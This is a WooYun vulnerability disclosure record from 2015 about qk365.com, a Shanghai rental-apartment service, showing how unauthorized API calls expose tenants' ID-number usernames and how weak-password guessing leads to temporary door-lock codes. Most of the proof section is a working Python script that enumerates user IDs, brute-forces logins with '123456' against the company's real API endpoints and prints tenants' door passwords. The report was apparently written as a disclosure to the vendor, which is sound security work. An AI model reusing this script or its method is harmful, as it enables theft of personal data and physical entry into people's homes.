{"id": 72161, "wybug_id": "wooyun-2015-0151351", "wybug_title": "青客时尚租房(上海最大的白领公寓)遍历用户信息/可开租客房门", "wybug_corp": "qk365.com", "wybug_author": "xiao.k", "wybug_date": "2015-11-05 15:50", "wybug_open_date": "2015-12-20 18:26", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["越权操作", "用户敏感信息泄露", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向公众公开  简要描述： 青客专注于白领公寓租赁和提供物业管理，是沪上精品租房的领跑品牌，励志为青年人才解决住房问题。互联网模式下的租房模式也产生了一些安全问题。 详细说明：  青客虽然采用的合租形式，但是居住模式比较时尚。房间的电子锁支持密码和房卡，电费等可以实现网上缴费。如果忘记了房间卡，可以通过APP，获取临时密码开门。### 未授权访问用户身份信息我们先抓个包\n\n当我们把cookies改为空且diviceid改为空时，可以越权访问到用户的个人信息。注意，这里的set-cookie为关键的登录凭据。下方的所以请求都会用到。username为身份证号。为什么会是身份证号？会不会是别的呢？可能会，但是在签合同的时候，他们系统会帮你生成这样的一个账户，除非你单独设置。### 获取用户房间信息之前我提到了忘记房卡可以通过APP获取临时密码，然后可以利用临时密码开门。我们先获取下某用户的房间信息。\n\n在请求处的cookies，需要设置为上一步返回的set-cookies。请求后可以看到当前用户的房间信息。注意图中标明的几个值，接下来会用到。### 获取用户房间临时密码根据上一步的信息，我们可以继续构造数据包。这里的username、token、roomId、cutId、cucId。我们都能获取到，除了用户的密码。\n\n返回的lockpwd为临时的开门密码。因为还需要用户的登录密码，我们可以考虑撞库试试。### 撞库下面是登录数据包\n\n数据包中的sign并不是登录密码，而是md5(username + password + token)。算法是从下方js获取的。http://i.qk365.com/mobile/static/js/login.js### 利用程序如果想批量获取租户的临时密码，有以下思路：> 首先通过越权漏洞，批量获取用户的登录名。然后采用登录接口，扫描弱口令的用户。拿到用户口令后，查询房间情况。如果有房间。我们发送请求，获取租客房间的临时密码。   漏洞证明：  \n\n\nimport requestsimport hashlibimport jsonimport reimport times = requests.Session()def get_lockpassword(username,password,token,roomId,cutId,cucId):\tglobal s\tdata = {\"username\":username,\"token\":token,\"password\":password,\"roomId\":roomId,\"cutId\":cutId,\"cucId\":cucId}\theaders = {'User-Agent':'qk365/1.7.2 (iPhone; iOS 9.1; Scale/2.00)','Content-Type': 'application/json'}\tr = s.post('http://api.qk365.com/mobile/t/door/code/checkHash.json',headers=headers,data=json.dumps(data))\tret = r.json()\treturn ret['lockpwd']\tpassdef get_romeinfo():\tglobal s\tcutId = token = roomId = cucId = ''\theaders = {'User-Agent':'qk365/1.7.2 (iPhone; iOS 9.1; Scale/2.00)','Content-Type': 'application/json'}\tret = s.get('http://api.qk365.com/mobile/t/door/code/index.html',headers=headers)\tfindroom = ret.content.find('changeRoom')\tif findroom > 0:\t\tfindroom = True\telse:\t\tfindroom = False\tsubject = ret.content\tif findroom > 0 :\t\tprint 'has room'\t\tresult = re.findall('changeRoom\\(this\\);\">(.*?)</li>', subject, re.IGNORECASE | re.MULTILINE)\t\taddress = result[0]\t\tprint address\t\tresult = re.findall('value=\"(.*?)\" id=\"cutId\"', subject, re.IGNORECASE | re.MULTILINE)\t\tcutId = result[0]\t\tresult = re.findall('value=\"(.*?)\" id=\"token\"', subject, re.IGNORECASE | re.MULTILINE)\t\ttoken = result[0]\t\tresult = re.findall('roomId=\"(.*?)\"', subject, re.IGNORECASE | re.MULTILINE)\t\troomId = result[0]\t\tresult = re.findall('cucId=\"(.*?)\"', subject, re.IGNORECASE | re.MULTILINE)\t\tcucId = result[0]\telse:\t\tprint 'no room'\treturn findroom,token,roomId,cutId,cucId\tpassdef login(username,password):\tglobal s\tsign = hashlib.md5(username + password + '1').hexdigest() \tdata = {\"token\":\"1\",\"username\":username,\"sign\":sign,\"deviceId\":\"x\"}\theaders = {'User-Agent':'qk365/1.7.2 (iPhone; iOS 9.1; Scale/2.00)','Content-Type': 'application/json'}\tr = s.post('http://api.qk365.com/mobile/app/login/login.json',data=json.dumps(data),headers=headers)\tret = r.json()\tif ret['result'] == 2 :\t\treturn False\tif ret['result'] == 0 :\t\treturn True\tpassdef get_userinfo(id):\tglobal s\tid = int(id)\tdata = {\"userId\":id,\"deviceId\":\"\"}\theaders = {'User-Agent':'qk365/1.7.2 (iPhone; iOS 9.1; Scale/2.00)','Content-Type': 'application/json'}\tr = s.post('http://api.qk365.com/mobile/t/app/membership/user.json',data=json.dumps(data),headers=headers)\tret = r.json()\treturn ret['username']\tpassdef main():\tfor id in xrange(53255,53623): //这里为用户的id，可以从0开始破解\t\tprint id\t\tusername = get_userinfo(id)\t\tret = login(username,'123456')\t\tif ret:\t\t\tprint username,'123456'\t\t\tfindroom,token,roomId,cutId,cucId = get_romeinfo()\t\t\tif findroom :\t\t\t\tprint 'lockpwd = ' + get_lockpassword(username,'123456',token,roomId,cutId,cucId)\t\t\t\tpass\t\t\tpass\t\tpass\tpassif __name__ == '__main__':\tmain()\n   修复方案：  做好权限控制。我也是你们的租客之一，希望你们今后能提供更安全的服务，更多的房源。   版权声明：转载请注明来源 xiao.k@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-05 18:25 厂商回复： 非常感谢你帮我们系统安全检测出漏洞，我们将重视这个问题，并立即进行整改。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-11-04 23:06 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1077 漏洞数:139        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  NB。。。屌爆了。。尽快通知到相关负责人，第一时间整改漏洞    \n     2015-11-05 16:37 |    \t\tSuperRookie \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:11        | 求收编，本人会注入，会上传，会Xss，会破...)\t\t \n  我以为第一时间是开门进屋看看    \n     2015-11-07 15:18 |    \t\t坏男孩-A_A \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:5        | 菜鸟一枚)\t\t \n  666666666666坐等细节，CCAV来不来？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}